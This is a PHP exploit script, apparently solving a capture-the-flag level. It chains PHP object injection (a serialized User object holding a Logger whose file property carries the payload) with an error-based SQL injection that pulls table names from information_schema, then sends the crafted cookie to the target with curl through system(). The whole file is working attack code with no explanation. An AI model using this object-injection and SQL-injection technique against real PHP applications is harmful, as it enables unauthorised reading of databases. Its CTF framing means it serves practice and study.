<?php

$sql = "select table_name from information_schema.tables where table_schema like '%ctf%' limit 1,1";

$ouch = "' AND(
                SELECT 1
                FROM (SELECT count(*),
                        concat((SELECT ($sql) FROM
                                information_schema.tables
                                LIMIT 0,1), FLOOR(RAND(0)*2))x
                    FROM information_schema.tables GROUP BY x)a
                ) and '1'='1";

class Logger
{
    protected $_messages;

    protected $_file;

    function __construct()
    {
        $this->_messages = ["need_this_string"];
        global $ouch;
        $this->_file = $ouch;
    }
}

class User
{
    protected $_role;

    function __construct()
    {
        $this->_role = new Logger();
    }
}

$cookie = urlencode(serialize(new User));

system("curl -s http://ctf.s/levels/unuser/ -b user='$cookie'");
